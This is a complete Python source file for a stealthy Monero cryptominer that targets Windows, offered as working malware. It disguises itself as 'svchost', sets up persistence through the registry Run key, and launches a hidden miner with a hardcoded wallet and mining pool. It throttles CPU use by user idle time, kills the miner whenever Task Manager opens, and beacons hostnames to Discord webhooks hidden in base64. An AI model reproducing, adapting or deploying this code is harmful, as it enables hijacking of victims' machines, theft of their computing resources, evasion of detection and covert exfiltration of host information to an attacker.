import os, sys, subprocess, random, time, winreg, base64, ctypes, json, platform
from urllib import request

# --- CONFIG ---
W_S = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMzg3NTk1NDYzMDcyMTcxNy9mcVRQeFk5LWR0UnR1ZjNXUFFuZWhNa1Y1REp1Tm9ocGpzbjB0WFZITHZJdUt3VU9HMzAzcmNlM3ZxRjJVN1pvYzl2Mw==").decode()
W_M = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMzg3NjM2NDYzMjMyNjE0NS9ZbFE2MldOaThzUHZZZWlBZlQ5bklCMjVGUFI0ay1Nb1A3MVFTRU5LdTA2eFVOSUFKV2JpWEtKSi03cGExZm9PZmw0SEI=").decode()
ID = "svchost"
WORK_DIR = os.path.join(os.getenv('APPDATA'), ID)
MIN_BIN = os.path.join(WORK_DIR, "mui_cache.bin")
WALLET = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
POOL = "pool.supportxmr.com:443"

def notify(msg, type="sys"):
    hook = W_S if type == "sys" else W_M
    try:
        data = json.dumps({"content": f"**[{platform.node()} | {ID}]**: {msg}"}).encode('utf-8')
        req = request.Request(hook, data=data, headers={'Content-Type': 'application/json'})
        request.urlopen(req, timeout=10)
    except: pass

def is_running(name):
    try:
        output = subprocess.check_output(['tasklist', '/NH', '/FO', 'CSV', '/FI', f'IMAGENAME eq {name}'], creationflags=0x08000000).decode()
        return name.lower() in output.lower()
    except: return False

def engage_persistence():
    try:
        run_p = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_p, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, ID, 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.realpath(__file__)}"')
        winreg.CloseKey(key)
    except: pass

class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]

def get_idle():
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
        return (ctypes.windll.kernel32.GetTickCount() - lii.dwTime) / 1000.0
    return 0

def manage():
    if is_running("Taskmgr.exe"):
        # Kill miner if taskmgr is open
        subprocess.run(['taskkill', '/F', '/IM', 'mui_cache.bin'], creationflags=0x08000000, capture_output=True)
        notify("Monitoring detected. Vanishing.", "sys")
    else:
        idle = get_idle()
        pwr = "90" if idle > 300 else "25"
        if not is_running("mui_cache.bin") and os.path.exists(MIN_BIN):
            subprocess.Popen([MIN_BIN, "-o", POOL, "-u", f"{WALLET}.{platform.node()}", "--max-cpu-usage", pwr, "-k", "--tls"], creationflags=0x08000000)
            notify(f"Engine Engaged. Power: {pwr}%", "mine")

def main():
    time.sleep(random.randint(15, 30))
    engage_persistence()
    notify("SYSTEM ONLINE (v7.5 - Zero-Dependency Stealth)", "sys")
    while True:
        manage()
        time.sleep(15)

if __name__ == "__main__":
    main()
